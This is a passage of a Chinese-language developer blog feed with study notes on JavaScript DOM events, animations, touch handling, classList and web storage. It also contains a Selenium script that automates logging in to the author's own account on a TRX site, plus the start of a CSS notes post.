class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .box &#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 200px;</span><br><span class="line">            background-color: purple;</span><br><span class="line">            margin: 100px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;box&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var box = document.querySelector(&#x27;.box&#x27;);</span><br><span class="line">        box.addEventListener(&#x27;mousedown&#x27;, function (e) &#123;</span><br><span class="line">            var x = e.pageX - this.offsetLeft;</span><br><span class="line">            var y = e.pageY - this.offsetTop;</span><br><span class="line">            console.log(x);</span><br><span class="line">            console.log(y);</span><br><span class="line">            function move(e) &#123;</span><br><span class="line">                box.style.marginLeft = e.pageX - x + &#x27;px&#x27;;</span><br><span class="line">                box.style.marginTop = e.pageY - y + &#x27;px&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">            document.addEventListener(&#x27;mousemove&#x27;, move);</span><br><span class="line">            document.addEventListener(&#x27;mouseup&#x27;, function () &#123;</span><br><span class="line">                document.removeEventListener(&#x27;mousemove&#x27;, move);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="元素可视区client"><a href="#元素可视区client" class="headerlink" title="元素可视区client"></a>元素可视区client</h3><p>使用client属性获取元素可是去的相关信息，通过client可以动态获得该元素边框大小、元素大小。</p><p><img src="https://i.loli.net/2021/11/23/kQ3FBsKPCtnSdJp.png" alt="image-20211123202414214"></p><h3 id="元素滚动scroll"><a href="#元素滚动scroll" class="headerlink" title="元素滚动scroll"></a>元素滚动scroll</h3><p>可以动态的到元素的大小、滚动距离</p><p><img src="https://i.loli.net/2021/11/23/D8alTbrWhgGy5Pz.png" alt="image-20211123205310081"></p><p><img src="https://i.loli.net/2021/11/23/osEhX93ntQYi5Zp.png" alt="image-20211123205401675"></p><p><img src="https://i.loli.net/2021/11/23/Rk3BqN7f5jJhwCt.png" alt="image-20211123210548516"></p><p><img src="https://i.loli.net/2021/11/23/Arjb9ZUxQtcq2s6.png" alt="image-20211123210705222"></p><h2 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数"></a>立即执行函数</h2><p>(function(){}())或者(function(){})()：不需要调用，立即执行</p><h2 id="mouseover和mouseenter"><a href="#mouseover和mouseenter" class="headerlink" title="mouseover和mouseenter"></a>mouseover和mouseenter</h2><p>mouserover鼠标经过自身盒子会触发，经过子盒子也会触发</p><p>mouseenter鼠标只有经过自身盒子会触发</p><p>mouseenter和mouseleave不会冒泡</p><h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><p><strong>核心原理</strong>：通过定时器setInterval()不断移动盒子</p><p><strong>实现步骤：</strong></p><ol><li>获得盒子位置</li><li>让盒子在当前位置加上一个移动距离</li><li>利用定时器不断重复这个操作</li><li>加一个定时器结束条件</li><li><strong>此元素需要加定位才能用element.style.left</strong></li></ol><p>CSS中动画使用keyframes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        @keyframes move &#123;</span><br><span class="line">            from &#123;</span><br><span class="line">                transform: translate(0, 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            to &#123;</span><br><span class="line">                transform: translate(1000px, 0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        div &#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 200px;</span><br><span class="line">            background-color: pink;</span><br><span class="line">            animation-name: move;</span><br><span class="line">            animation-duration: 2s;</span><br><span class="line">            animation-iteration-count: infinite;</span><br><span class="line">            animation-direction: alternate-reverse;</span><br><span class="line">            animation: move 2s ease 0s infinite alternate forwards;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        div &#123;</span><br><span class="line">            position: absolute;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 200px;</span><br><span class="line">            background-color: pink;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var div = document.querySelector(&#x27;div&#x27;);</span><br><span class="line">        var timer = setInterval(function () &#123;</span><br><span class="line">            if (div.offsetLeft &gt;= 400) &#123;</span><br><span class="line">                clearInterval(timer);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            div.style.left = div.offsetLeft + 10 + &#x27;px&#x27;;</span><br><span class="line">        &#125;, 10)</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="动画函数封装"><a href="#动画函数封装" class="headerlink" title="动画函数封装"></a>动画函数封装</h2><p><strong>动画对象</strong>+<strong>移动的距离</strong></p><p>function animate(obj,target){</p><p>}</p><h3 id="清除定时器"><a href="#清除定时器" class="headerlink" title="清除定时器"></a>清除定时器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        div &#123;</span><br><span class="line">            position: absolute;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 200px;</span><br><span class="line">            background-color: pink;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;button&gt;点击&lt;/button&gt;</span><br><span class="line">    &lt;div&gt;123&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function animate(obj, target) &#123;</span><br><span class="line">            clearInterval(obj.timer);</span><br><span class="line">            obj.timer = setInterval(function () &#123;</span><br><span class="line"></span><br><span class="line">                if (obj.offsetLeft &gt;= target) &#123;</span><br><span class="line">                    clearInterval(timer);</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                    obj.style.marginLeft = obj.offsetLeft + 1 + &#x27;px&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, 1000)</span><br><span class="line">        &#125;</span><br><span class="line">        var div = document.querySelector(&quot;div&quot;);</span><br><span class="line">        var btn = document.querySelector(&quot;button&quot;);</span><br><span class="line">        btn.addEventListener(&quot;click&quot;, function () &#123;</span><br><span class="line">            animate(div, 300);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="缓动动画"><a href="#缓动动画" class="headerlink" title="缓动动画"></a>缓动动画</h3><p>运动速度缓慢降下来，目标值-现在的位置/10作为每次移动的距离步长</p><h3 id="节流阀"><a href="#节流阀" class="headerlink" title="节流阀"></a>节流阀</h3><p>避免轮播图按钮连续点击造成播放过快</p><p>利用回调函数，添加一个变量控制，锁住函数和解锁函数。</p><p>设置一个var flag=true;</p><p>if(flag){</p><p>​    flag=false;//关闭水龙头</p><p>​    do something;</p><p>}</p><p>回调函数运行完后flag=true;//打开水龙头</p><h2 id="移动端网页特效"><a href="#移动端网页特效" class="headerlink" title="移动端网页特效"></a>移动端网页特效</h2><h3 id="touch事件-TouchEvent"><a href="#touch事件-TouchEvent" class="headerlink" title="touch事件 TouchEvent"></a>touch事件 TouchEvent</h3><p>touchstart：手触摸到一个DOM元素时触发</p><p>touchmove:手指在一个DOM元素上滑动时触发</p><p>touchend:手指从一个元素上移开时触发</p><p>touches:正在触摸屏幕的所有手指的列表</p><p>targetTouches：正在触摸当前DOM元素的手指列表</p><p>changedTouches:手指状态发生改变的列表，从无到有，从有到无</p><p>手指离开屏幕时，没有touches和targetTouches，只有changedTouches</p><p>最常使用targetTouches</p><h3 id="移动端拖动元素"><a href="#移动端拖动元素" class="headerlink" title="移动端拖动元素"></a>移动端拖动元素</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var div = document.querySelector(&quot;div&quot;);</span><br><span class="line">    var startX = 0;//手指初始坐标</span><br><span class="line">    var startY = 0;</span><br><span class="line">    var x = 0;//盒子的初始坐标</span><br><span class="line">    var y = 0;</span><br><span class="line">    div.addEventListener(&#x27;touchstart&#x27;, function (e) &#123;</span><br><span class="line">        startX = e.targetTouches[0].pageX;</span><br><span class="line">        startY = e.targetTouches[0].pageY;</span><br><span class="line">        x = this.offsetLeft;</span><br><span class="line">        y = this.offsetTop;</span><br><span class="line">    &#125;)</span><br><span class="line">    div.addEventListener(&#x27;touchmove&#x27;, function (e) &#123;</span><br><span class="line">        var moveX = e.targetTouches[0].pageX - startX;</span><br><span class="line">        var moveY = e.targetTouches[0].pageY - startY;</span><br><span class="line">        this.style.left = x + moveX + &#x27;px&#x27;;</span><br><span class="line">        this.style.top = y + moveY + &#x27;px&#x27;;</span><br><span class="line">        e.preventDefault();</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="classList属性"><a href="#classList属性" class="headerlink" title="classList属性"></a>classList属性</h2><p><img src="https://i.loli.net/2021/12/01/aknDpoFMYAIL8yK.png" alt="image-20211201211443069"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .bg &#123;</span><br><span class="line">            background-color: #000;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;button&gt;开关灯&lt;/button&gt;</span><br><span class="line">    &lt;div class=&quot;zx&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var div = document.querySelector(&quot;div&quot;);</span><br><span class="line">        console.log(div.classList);</span><br><span class="line">        console.log(div.className);</span><br><span class="line">        var btn = document.querySelector(&quot;button&quot;);</span><br><span class="line">        btn.addEventListener(&#x27;click&#x27;, function () &#123;</span><br><span class="line">            document.body.classList.toggle(&#x27;bg&#x27;);</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>element.classList.add(‘类名’)：不会覆盖，className会覆盖</p><p>element.classList.remove(‘类名’)</p><p>element.classList.toggle(‘类名’)</p><p><img src="https://i.loli.net/2021/12/01/CzO8hwVZk9mS4Ml.png" alt="image-20211201215412950"></p><p><img src="https://i.loli.net/2021/12/01/pYoxnQTKXelZudk.png" alt="image-20211201215423092"></p><h2 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h2><ol><li>数据存储在用户浏览器</li><li>设置，读取方便、甚至页面刷新也不丢是数据</li><li>容量大，sessionStorage约5M，localStorage约20M</li><li>只能存储字符串，可以将JSON.stringify()编码后存储</li></ol><h3 id="window-sessionStorage"><a href="#window-sessionStorage" class="headerlink" title="window.sessionStorage"></a>window.sessionStorage</h3><ol><li>生命周期为关闭浏览器</li><li>在同一个窗口下数据可以共享</li><li>以key:value键值对实现</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sessionStorage.setItem(key,value)</span><br><span class="line">sessionStorage.getItem(key)</span><br><span class="line">sessionStorage.removeItem(key)</span><br><span class="line">sessionStorage.clear()</span><br></pre></td></tr></table></figure><h3 id="window-localStorage"><a href="#window-localStorage" class="headerlink" title="window.localStorage"></a>window.localStorage</h3><ol><li>生命周期永久有效，除非手动删除，否则关闭页面也会存在</li><li>可以多窗口共享，只要是同一浏览器</li><li>以键值对的形式存储</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem(key,value)</span><br><span class="line">localStorage.setItem(key,value)</span><br><span class="line">localStorage.getItem(key)</span><br><span class="line">localStorage.removeItem(key)</span><br><span class="line">localStorage.clear()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;javascript&quot;&gt;&lt;a href=&quot;#javascript&quot; class=&quot;headerlink&quot; title=&quot;javascript&quot;&gt;&lt;/a&gt;javascript&lt;/h1&gt;&lt;h2 id=&quot;javascript执行顺序&quot;&gt;&lt;a href=&quot;#javascr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python+selenium实现自动登录等操作</title>
    <link href="https://zengxiang21.github.io/2021/12/02/python+selenium%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E7%AD%89%E6%93%8D%E4%BD%9C/"/>
    <id>https://zengxiang21.github.io/2021/12/02/python+selenium%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E7%AD%89%E6%93%8D%E4%BD%9C/</id>
    <published>2021-12-02T07:21:30.803Z</published>
    <updated>2022-01-11T12:43:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-selenium实现自动登录等操作"><a href="#python-selenium实现自动登录等操作" class="headerlink" title="python+selenium实现自动登录等操作"></a>python+selenium实现自动登录等操作</h1><p><strong>采用vscode实现Trx Capital每24H自动claim 1.25TRX的操作</strong></p><p>采用的技术点</p><p>selenium库选择对象</p><p>selenium注意的点</p><p>selenium.common.exceptions.ElementClickInterceptedException: Message:element click intercepted: Element &lt;&gt;…&lt;&gt; is not clickable at point (xxx, xxx). element click intercepted &lt;&gt;…&lt;&gt;<br>出现无法点击的情况</p><p>这时候就是点击的按钮不在可视区内，需要添加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = browser.find_element(By.CSS_SELECTOR,<span class="string">&#x27;xxx&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&quot;arguments[0].click();&quot;</span>,a)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/12/02/QPZ8cUWq5Do6eXw.png" alt="image-20211202151847150"></p><p><img src="https://i.loli.net/2021/12/02/sPuRZHtSoNFKBan.png" alt="image-20211202154313123"></p><p><img src="https://i.loli.net/2021/12/02/GA9lBDWctHiXk1y.png" alt="image-20211202154343956"></p><p><img src="https://i.loli.net/2021/12/02/lG7riQvTmS51zRP.png" alt="image-20211202154410939"></p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://trx.capital/mobile/index.html&#x27;</span>//网站地址</span><br><span class="line"></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.find_element_by_name(<span class="string">&quot;phone&quot;</span>).send_keys(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">browser.find_element_by_name(<span class="string">&quot;pwd&quot;</span>).send_keys(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">denglu = browser.find_element_by_id(<span class="string">&quot;denglu&quot;</span>)</span><br><span class="line">denglu.click()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">a = browser.find_element_by_xpath(</span><br><span class="line">    <span class="string">&quot;//div[@class=&#x27;flex-1 dp-flex-row flex-js-center&#x27;]/button&quot;</span>)//按照XML格式选取，F12查看<span class="built_in">id</span>或者<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">a</span>.<span class="title">click</span>()</span></span><br><span class="line"><span class="class"><span class="title">sleep</span>(<span class="params"><span class="number">2</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">b</span> = <span class="title">browser</span>.<span class="title">find_element_by_xpath</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="class">    <span class="string">&quot;//div[@class=&#x27;row no-gutters justify-content-center&#x27;]/div[4]/a/i&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">b</span>.<span class="title">click</span>()</span></span><br><span class="line"><span class="class"><span class="title">sleep</span>(<span class="params"><span class="number">2</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">c</span> = <span class="title">browser</span>.<span class="title">find_element_by_xpath</span>(<span class="params"><span class="string">&quot;//div[@class=&#x27;link&#x27;]/div[2]/a&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">c</span>.<span class="title">click</span>()</span></span><br><span class="line"><span class="class"><span class="title">d</span> = <span class="title">browser</span>.<span class="title">find_element_by_xpath</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="class">    <span class="string">&quot;//div[@class=&#x27;container mb-4&#x27;]/div[3]/input&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">d</span>.<span class="title">send_keys</span>(<span class="params"><span class="string">&quot;1.25&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">e</span> = <span class="title">browser</span>.<span class="title">find_element_by_xpath</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="class">    <span class="string">&quot;//div[@class=&#x27;container mb-4&#x27;]/div[4]/textarea&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">e</span>.<span class="title">send_keys</span>(<span class="params"><span class="string">&quot;TJQEUCQvy6wQGzAc6x2JXcDtPrTUYntrGc&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">f</span> = <span class="title">browser</span>.<span class="title">find_element_by_xpath</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="class">    <span class="string">&quot;//div[@class=&#x27;container mb-4&#x27;]/div[5]/input&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">f</span>.<span class="title">send_keys</span>(<span class="params"><span class="string">&quot;xxx&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">g</span> = <span class="title">browser</span>.<span class="title">find_element_by_xpath</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="class">    <span class="string">&quot;//div[@class=&#x27;container text-center&#x27;]/button&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">sleep</span>(<span class="params"><span class="number">3</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">browser</span>.<span class="title">execute_script</span>(<span class="params"><span class="string">&quot;arguments[0].click();&quot;</span>, g</span>)//避免按键不在屏幕内无法点击的情况</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python-selenium实现自动登录等操作&quot;&gt;&lt;a href=&quot;#python-selenium实现自动登录等操作&quot; class=&quot;headerlink&quot; title=&quot;python+selenium实现自动登录等操作&quot;&gt;&lt;/a&gt;python+seleniu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>前端CSS</title>
    <link href="https://zengxiang21.github.io/2021/11/16/css/"/>
    <id>https://zengxiang21.github.io/2021/11/16/css/</id>
    <published>2021-11-16T08:25:21.596Z</published>
    <updated>2021-12-02T07:22:31.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="实现垂直居中"><a href="#实现垂直居中" class="headerlink" title="实现垂直居中"></a>实现垂直居中</h2><p>盒子height=line-height</p><h2 id="List去除小圆点"><a href="#List去除小圆点" class="headerlink" title="List去除小圆点"></a>List去除小圆点</h2><p>list-style:none;</p><h2 id="margin"><a href="#margin" class="headerlink" title="margin"></a>margin</h2><p>margin-left<br><br>margin-right<br><br>margin-top<br><br>margin-bottom<br></p><p>1.margin常用来设置块级盒子水平居中，需要满足下面两个条件：</p><ul>    <li>盒子必须指定高度</li>    <li>盒子左右边距设为auto</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        div &#123;</span><br><span class="line">            width: 200px;</span><br><span class="line">            height: 200px;</span><br><span class="line">            background-color: pink;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .one &#123;</span><br><span 